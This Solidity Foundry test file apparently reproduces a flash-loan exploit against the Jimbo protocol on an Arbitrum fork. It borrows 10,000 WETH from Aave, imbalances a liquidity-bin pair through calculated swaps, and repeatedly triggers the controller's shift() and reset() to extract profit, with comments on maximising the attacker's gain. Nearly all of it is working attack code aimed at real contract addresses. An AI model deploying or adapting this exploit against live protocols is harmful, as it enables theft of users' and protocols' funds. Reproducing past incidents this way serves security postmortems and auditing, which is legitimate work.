// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./interface.sol";
// import { CheatCodes } from "../src/CheatCodes.sol";

interface ILBPair {
    function getActiveId() external view returns (uint24 activeId);
    function getBin(uint24 id) external view returns (uint128 binReserveX, uint128 binReserveY);
}

interface ILBRouter {
    enum Version {
        V1,
        V2,
        V2_1
    }
    struct Path {
        uint256[] pairBinSteps;
        Version[] versions;
        IERC20[] tokenPath;
    }

    function swapNATIVEForExactTokens(uint256 amountOut, Path memory path, address to, uint256 deadline)
        external
        payable
        returns (uint256[] memory amountsIn);
    function swapExactTokensForNATIVE(
        uint256 amountIn,
        uint256 amountOutMinNATIVE,
        Path memory path,
        address payable to,
        uint256 deadline
    ) external returns (uint256 amountOut);
}

interface IJimbo {
    function shift() external returns (bool);
    function reset() external returns (bool);
    function recycle() external returns (bool);
}


contract JimboTest is Test {

    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address constant JimboController = 0x271944d9D8CA831F7c0dBCb20C4ee482376d6DE7;
    address constant JIMBOContract = 0xC3813645Ad2Ea0AC9D4d72D77c3755ac3B819e38;
    address constant LBPairProxy = 0x16a5D28b20A3FddEcdcaf02DF4b3935734df1A1f;
    address constant WETHProxy = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address constant LBRouterContract = 0xb4315e873dBcf96Ffd0acd8EA43f689D8c20fB30;
    address constant LBFactory = 0x8e42f2F4101563bF679975178e880FD87d3eFd4e;
    address constant AaveL2Pool = 0x794a61358D6845594F94dc1DB02A252b5b4814aD;

    constructor() {
    }

    function setUp() public {
        cheat.label(LBPairProxy, "LBPair");
        cheat.label(JIMBOContract, "JIMBO");
        cheat.label(LBRouterContract, "LBRouter");
        cheat.label(JimboController, "JimboController");
        cheat.label(WETHProxy, "WETH");
        cheat.label(LBFactory, "LBFactory");
        cheat.createSelectFork("arbitrum", 95144405);
        deal(address(this), 0);
    }

    function testExploit() public {
        IERC20 WETH = IERC20(WETHProxy);
        IAaveFlashloan AaveFlashloan = IAaveFlashloan(AaveL2Pool);
        WETH.approve(AaveL2Pool, type(uint256).max);
        address[] memory assets = new address[](1);
        assets[0] = WETHProxy;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 10_000 ether;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        bytes memory params = "";
        AaveFlashloan.flashLoan(address(this), assets, amounts, modes, address(0), params, 0);
        uint256 balanceAfterFirst = WETH.balanceOf(address(this));
        console.log("[+]Balance after paying off flashloan (attack1): %s", balanceAfterFirst);
        cheat.rollFork(95144406);
        AaveFlashloan.flashLoan(address(this), assets, amounts, modes, address(0), params, 0);
        uint256 balanceAfterSecond = WETH.balanceOf(address(this));
        console.log("[+]Balance after paying off flashloan (attack2): %s", balanceAfterSecond);
    }

   function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        console.log("[+]Received flashloan");
        IERC20 JIMBO = IERC20(JIMBOContract);
        WETH9 WETH = WETH9(WETHProxy);
        WETH.approve(LBRouterContract, type(uint256).max);
        JIMBO.approve(LBRouterContract, type(uint256).max);
        WETH.withdraw(10_000 ether);
        _doSwapsLogic();
        WETH.deposit{value: address(this).balance}();
        return true;
    }

    function _doSwapsLogic() internal {
        // attacker runs this same exploit twice, at block n and block n+1
        console.log("[+]Setting up for first swap");
        IERC20 JIMBO = IERC20(JIMBOContract);
        ILBPair LBPair = ILBPair(LBPairProxy);
        uint256 controllerBalanceBefore = JIMBO.balanceOf(JimboController);
        uint24 startingId = LBPair.getActiveId();
        // trigger where 'rebalance' occurs
        // will be new floor after 'rebalance' following huge swap
        uint24 triggerId = startingId + 6;
        console.log("-JimboController balance of JIMBO before exploit: %s", controllerBalanceBefore);
        _firstSwap(startingId);
        // when active bin is above current, shift(), when below, reset()
        // do it repeatedly to maximize attacker profit
        _triggerShift();
        _secondSwap(triggerId);
        _nextSwaps(triggerId);
        _nextSwaps(triggerId);
        _nextSwaps(triggerId);
        _triggerReset();
        // loop the attack
        _firstSwap(triggerId);
        _triggerShift();
        _secondSwap(triggerId);
        _nextSwaps(triggerId);
        _nextSwaps(triggerId);
        _nextSwaps(triggerId);
        _triggerReset();
        // now the active bin should == floor bin, liquidity is getting very low
        _firstSwap(triggerId);
        _triggerShift();
        uint256 balanceAfter = JIMBO.balanceOf(address(this));
        console.log("[+]Attacker JIMBO balance after exploit: %s", balanceAfter);
        console.log("[+]Swapping JIMBO profits for ETH");
        _swapForNative(balanceAfter);
        _triggerReset();
        console.log("[+]Final ETH balance: %s", address(this).balance);
    }

    function _firstSwap(uint24 activeIdBefore) internal {
        // -----------------------------get bin amounts------------------------
        ILBPair LBPair = ILBPair(LBPairProxy);
        ILBRouter LBRouter = ILBRouter(LBRouterContract);
        IERC20 JIMBO = IERC20(JIMBOContract);
        IERC20 WETH = IERC20(WETHProxy);
        // this max bin can be determined by calling contract storage
        uint24 tailBinId = 8388607;
        // calculate the amount in the active bin and the adjacent bins
        // we'll remove this amount + dust amount to imabalance the pool
        (uint128 activeBinX, uint128 activeBinY) = LBPair.getBin(activeIdBefore);
        console.log("-Amount of JIMBO in active bin before exploit: %s", activeBinX);
        console.log("-Amount of WETH in active bin before exploit: %s", activeBinY);
        uint128 inactiveBinsX;
        // 51 is defined by the protocol as number of bins to spread liquidity into
        for (uint24 i = 0; i < 51; i++) {
            uint24 currentBinId = activeIdBefore + i + 1;
            (uint128 currentX, ) = LBPair.getBin(currentBinId);
            inactiveBinsX += currentX;
        }
        console.log("-Amount of JIMBO in inactive bins before exploit: %s", inactiveBinsX);
        (uint128 dustX, ) = LBPair.getBin(tailBinId);
        console.log("-max bin JIMBO before exploit: %s", dustX);

        // -------------------------------swap in-------------------------------
        console.log("[+]Performing first swap");
        uint128 firstSwapAmount = activeBinX + inactiveBinsX + (dustX / 2);
        IERC20[] memory tokenPath = new IERC20[](2);
        tokenPath[0] = WETH;
        tokenPath[1] = JIMBO;
        uint256[] memory pairBinSteps = new uint256[](1); // pairBinSteps[i] refers to the bin step for the market (x, y) where tokenPath[i] = x and tokenPath[i+1] = y
        pairBinSteps[0] = 100;
        ILBRouter.Version[] memory versions = new ILBRouter.Version[](1);
        versions[0] = ILBRouter.Version.V2_1; // add the version of the Dex to perform the swap on
        ILBRouter.Path memory firstSwapPath;
        firstSwapPath.pairBinSteps = pairBinSteps;
        firstSwapPath.versions = versions;
        firstSwapPath.tokenPath = tokenPath;
        LBRouter.swapNATIVEForExactTokens{value: address(this).balance}(firstSwapAmount, firstSwapPath, address(this), block.timestamp+1);
        // the active bin should be changed now
        uint24 activeIdAfter = LBPair.getActiveId();
        console.log("-LB Pair active bin id after swap: %s", activeIdAfter);
    }

    function _triggerShift() internal {
        console.log("[+]Calling JimboController.shift()");
        // apeing into jimbo protocol so we can force it to 'rebalance'
        IERC20(JIMBOContract).transfer(JimboController, 100);
        // this will shift protocol liquidity to reinforce the new price point.
        // liquidity in each bin is determined by the constant sum invariant.
        // of course 1) the protocol isn't the only one able to LP into the pool,
        // and 2) people can freely swap through it rather than through the protocol,
        // and 3) price impact of a swap is a function of liquidity (constant sum),
        // so it's easy to make the protocol deeply unprofitable by imbalancing the pool
        IJimbo(JimboController).shift();
    }

    function _triggerReset() internal {
        console.log("[+]Calling JimboController.reset()");
        // active bin should be below protocol current now, so reset
        IJimbo(JimboController).reset();
    }

    function _secondSwap(uint24 floorBinId) internal {
        // ------------------------get bin amounts-----------------------------
        ILBPair LBPair = ILBPair(LBPairProxy);
        uint24 triggerBinId = 8388607;
        uint128 adjacentBinsY;
        console.log("[+]Getting new bin Liquidity");
        for (uint24 i = 0; i < 7; i++) {
            uint24 currentBinId = triggerBinId - i;
            (, uint128 currentY) = LBPair.getBin(currentBinId);
            adjacentBinsY += currentY;
        }
        (, uint128 floorY) = LBPair.getBin(floorBinId);
        console.log("-floorY: %s", floorY);
        console.log("-adjacentBinsY: %s", adjacentBinsY);
        uint128 secondSwapAmount = floorY + adjacentBinsY;
        // ------------------------swap back-----------------------------------
        console.log("[+]Performing second swap");
        _swapForNative(secondSwapAmount);
    }

    function _nextSwaps(uint24 floorBinId) internal {
        // ------------------------get bin amounts-----------------------------
        console.log("[+]Getting new bin liquidity");
        ILBPair LBPair = ILBPair(LBPairProxy);
        // active bin is now max bin - (anchor bins interval)
        uint24 activeBin = 8388602;
        (, uint128 floorY) = LBPair.getBin(floorBinId);
        (, uint128 activeBinY) = LBPair.getBin(activeBin);
        console.log("-activeBinY: %s", activeBinY);
        console.log("-floorBinY: %s", floorY);
        uint128 nextSwapAmount = activeBinY + floorY;
        // sweep the active range
        nextSwapAmount += (nextSwapAmount / 10);
        // ------------------------swap back-----------------------------------
        console.log("[+]Performing next swap");
        _swapForNative(nextSwapAmount);
    }

    function _swapForNative(uint256 swapAmount) internal {
        ILBRouter LBRouter = ILBRouter(LBRouterContract);
        IERC20 JIMBO = IERC20(JIMBOContract);
        IERC20 WETH = IERC20(WETHProxy);
        IERC20[] memory tokenPath = new IERC20[](2);
        tokenPath[0] = JIMBO;
        tokenPath[1] = WETH;
        uint256[] memory pairBinSteps = new uint256[](1); // pairBinSteps[i] refers to the bin step for the market (x, y) where tokenPath[i] = x and tokenPath[i+1] = y
        pairBinSteps[0] = 100;
        ILBRouter.Version[] memory versions = new ILBRouter.Version[](1);
        versions[0] = ILBRouter.Version.V2_1; // add the version of the Dex to perform the swap on
        ILBRouter.Path memory currentSwapPath;
        currentSwapPath.pairBinSteps = pairBinSteps;
        currentSwapPath.versions = versions;
        currentSwapPath.tokenPath = tokenPath;
        LBRouter.swapExactTokensForNATIVE(swapAmount, 0, currentSwapPath, payable(address(this)), block.timestamp + 1);
    }

    receive() external payable{
    }
}
